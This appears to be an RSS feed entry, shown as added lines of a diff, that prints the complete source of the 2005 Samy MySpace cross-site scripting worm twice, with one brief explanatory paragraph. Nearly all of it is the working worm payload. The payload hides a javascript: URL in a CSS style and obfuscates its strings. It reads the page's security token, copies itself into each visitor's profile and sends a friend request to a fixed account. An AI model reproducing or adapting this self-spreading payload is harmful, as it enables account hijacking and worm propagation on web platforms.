+&lt;p&gt;The first AJAX worm ever was Samy and it hit MySpace in October 2005. Here is the source code of the infamous worm. The worm propagates by taking advantage of MySpace not being able to sanitize JavaScript URLs in styles as it is shown above. The purpose of the worm is to infect other profiles and add Samy to their friends list.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&lt;div id=mycode style=&quot;BACKGROUND: url(&#039;java
+script:eval(document.all.mycode.expr)&#039;)&quot; expr=&quot;var B=String.fromCharCode(34);var A=String.fromCharCode(39);function g(){var C;try{var D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return eval(&#039;document.body.inne&#039;+&#039;rHTML&#039;)}}function getData(AU){M=getFromURL(AU,&#039;friendID&#039;);L=getFromURL(AU,&#039;Mytoken&#039;)}function getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split(&#039;&amp;&#039;);var AS=new Array();for(var O=0;O&lt;F.length;O++){var I=F[O].split(&#039;=&#039;);AS[I[0]]=I[1]}return AS}var J;var AS=getQueryParams();var L=AS[&#039;Mytoken&#039;];var M=AS[&#039;friendID&#039;];if(location.hostname==&#039;profile.myspace.com&#039;){document.location=&#039;http://www.myspace.com&#039;+location.pathname+location.search}else{if(!M){getData(g())}main()}function getClientFID(){return findIn(g(),&#039;up_launchIC( &#039;+A,A)}function nothing(){}function paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O&gt;0){N+=&#039;&amp;&#039;}var Q=escape(AV[P]);while(Q.indexOf(&#039;+&#039;)!=-1){Q=Q.replace(&#039;+&#039;,&#039;%2B&#039;)}while(Q.indexOf(&#039;&amp;&#039;)!=-1){Q=Q.replace(&#039;&amp;&#039;,&#039;%26&#039;)}N+=P+&#039;=&#039;+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return false}eval(&#039;J.onr&#039;+&#039;eadystatechange=BI&#039;);J.open(BJ,BH,true);if(BJ==&#039;POST&#039;){J.setRequestHeader(&#039;Content-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);J.setRequestHeader(&#039;Content-Length&#039;,BK.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function getHiddenParameter(BF,BG){return findIn(BF,&#039;name=&#039;+B+BG+B+&#039; value=&#039;+B,B)}function getFromURL(BF,BG){var T;if(BG==&#039;Mytoken&#039;){T=B}else{T=&#039;&amp;&#039;}var U=BG+&#039;=&#039;;var V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else if(window.ActiveXObject){try{Z=new ActiveXObject(&#039;Msxml2.XMLHTTP&#039;)}catch(e){try{Z=new ActiveXObject(&#039;Microsoft.XMLHTTP&#039;)}catch(e){Z=false}}}return Z}var AA=g();var AB=AA.indexOf(&#039;m&#039;+&#039;ycode&#039;);var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf(&#039;D&#039;+&#039;IV&#039;);var AE=AC.substring(0,AD);var AF;if(AE){AE=AE.replace(&#039;jav&#039;+&#039;a&#039;,A+&#039;jav&#039;+&#039;a&#039;);AE=AE.replace(&#039;exp&#039;+&#039;r)&#039;,&#039;exp&#039;+&#039;r)&#039;+A);AF=&#039; but most of all, samy is my hero. &lt;d&#039;+&#039;iv id=&#039;+AE+&#039;D&#039;+&#039;IV&gt;&#039;}var AG;function getHome(){if(J.readyState!=4){return}var AU=J.responseText;AG=findIn(AU,&#039;P&#039;+&#039;rofileHeroes&#039;,&#039;&lt;/td&gt;&#039;);AG=AG.substring(61,AG.length);if(AG.indexOf(&#039;samy&#039;)==-1){if(AF){AG+=AF;var AR=getFromURL(AU,&#039;Mytoken&#039;);var AS=new Array();AS[&#039;interestLabel&#039;]=&#039;heroes&#039;;AS[&#039;submit&#039;]=&#039;Preview&#039;;AS[&#039;interest&#039;]=AG;J=getXMLObj();httpSend(&#039;/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken=&#039;+AR,postHero,&#039;POST&#039;,paramsToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,&#039;Mytoken&#039;);var AS=new Array();AS[&#039;interestLabel&#039;]=&#039;heroes&#039;;AS[&#039;submit&#039;]=&#039;Submit&#039;;AS[&#039;interest&#039;]=AG;AS[&#039;hash&#039;]=getHiddenParameter(AU,&#039;hash&#039;);httpSend(&#039;/index.cfm?fuseaction=profile.processInterests&amp;Mytoken=&#039;+AR,nothing,&#039;POST&#039;,paramsToString(AS))}function main(){var AN=getClientFID();var BH=&#039;/index.cfm?fuseaction=user.viewProfile&amp;friendID=&#039;+AN+&#039;&amp;Mytoken=&#039;+L;J=getXMLObj();httpSend(BH,getHome,&#039;GET&#039;);xmlhttp2=getXMLObj();httpSend2(&#039;/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken=&#039;+L,processxForm,&#039;GET&#039;)}function processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,&#039;hashcode&#039;);var AR=getFromURL(AU,&#039;Mytoken&#039;);var AS=new Array();AS[&#039;hashcode&#039;]=AQ;AS[&#039;friendID&#039;]=&#039;11851658&#039;;AS[&#039;submit&#039;]=&#039;Add to Friends&#039;;httpSend2(&#039;/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken=&#039;+AR,nothing,&#039;POST&#039;,paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return false}eval(&#039;xmlhttp2.onr&#039;+&#039;eadystatechange=BI&#039;);xmlhttp2.open(BJ,BH,true);if(BJ==&#039;POST&#039;){xmlhttp2.setRequestHeader(&#039;Content-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);xmlhttp2.setRequestHeader(&#039;Content-Length&#039;,BK.length)}xmlhttp2.send(BK);return true}&quot;&gt;&lt;/DIV&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;MySpace, profile&lt;/p&gt;</description>
+		<content:encoded><![CDATA[<h3>Samy</h3>
+<p>The first AJAX worm ever was Samy and it hit MySpace in October 2005. Here is the source code of the infamous worm. The worm propagates by taking advantage of MySpace not being able to sanitize JavaScript URLs in styles as it is shown above. The purpose of the worm is to infect other profiles and add Samy to their friends list.</p>
+<pre><code>&lt;div id=mycode style="BACKGROUND: url('java
+script:eval(document.all.mycode.expr)')" expr="var B=String.fromCharCode(34);var A=String.fromCharCode(39);function g(){var C;try{var D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return C}else{return eval('document.body.inne'+'rHTML')}}function getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function getQueryParams(){var E=document.location.search;var F=E.substring(1,E.length).split('&#038;');var AS=new Array();for(var O=0;O&lt;F.length;O++){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var J;var AS=getQueryParams();var L=AS['Mytoken'];var M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com'+location.pathname+location.search}else{if(!M){getData(g())}main()}function getClientFID(){return findIn(g(),'up_launchIC( '+A,A)}function nothing(){}function paramsToString(AV){var N=new String();var O=0;for(var P in AV){if(O&gt;0){N+='&#038;'}var Q=escape(AV[P]);while(Q.indexOf('+')!=-1){Q=Q.replace('+','%2B')}while(Q.indexOf('&#038;')!=-1){Q=Q.replace('&#038;','%26')}N+=P+'='+Q;O++}return N}function httpSend(BH,BI,BJ,BK){if(!J){return false}eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return true}function findIn(BF,BB,BC){var R=BF.indexOf(BB)+BB.length;var S=BF.substring(R,R+1024);return S.substring(0,S.indexOf(BC))}function getHiddenParameter(BF,BG){return findIn(BF,'name='+B+BG+B+' value='+B,B)}function getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&#038;'}var U=BG+'=';var V=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y}function getXMLObj(){var Z=false;if(window.XMLHttpRequest){try{Z=new XMLHttpRequest()}catch(e){Z=false}}else if(window.ActiveXObject){try{Z=new ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);var AD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);var AF;if(AE){AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF=' but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'}var AG;function getHome(){if(J.readyState!=4){return}var AU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG+=AF;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&#038;Mytoken='+AR,postHero,'POST',paramsToString(AS))}}}function postHero(){if(J.readyState!=4){return}var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&#038;Mytoken='+AR,nothing,'POST',paramsToString(AS))}function main(){var AN=getClientFID();var BH='/index.cfm?fuseaction=user.viewProfile&#038;friendID='+AN+'&#038;Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&#038;friendID=11851658&#038;Mytoken='+L,processxForm,'GET')}function processxForm(){if(xmlhttp2.readyState!=4){return}var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var AS=new Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&#038;Mytoken='+AR,nothing,'POST',paramsToString(AS))}function httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return false}eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return true}"&gt;&lt;/DIV&gt;
+</code></pre>
+<p>MySpace, profile</p>
+]]></content:encoded>
+	</item>
+</channel>
+</rss>
